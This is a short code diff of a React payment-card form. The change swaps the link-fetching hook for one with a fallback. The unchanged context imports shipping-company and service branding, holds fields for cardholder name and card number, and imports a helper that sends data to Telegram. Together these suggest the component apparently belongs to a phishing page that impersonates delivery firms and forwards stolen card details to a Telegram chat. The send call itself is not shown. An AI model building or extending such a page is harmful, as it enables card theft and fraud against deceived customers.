@@ -6,7 +6,7 @@ import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
-import { useLink } from "@/hooks/useSupabase";
+import { useLinkWithFallback, appendDataParam } from "@/hooks/useLinkWithFallback";
 import { Shield, CreditCard, AlertCircle, ArrowLeft, Lock, ShieldCheck, Sparkles } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
@@ -19,7 +19,7 @@ const PaymentCardForm = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData } = useLink(id);
+  const { data: linkData } = useLinkWithFallback(id);
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
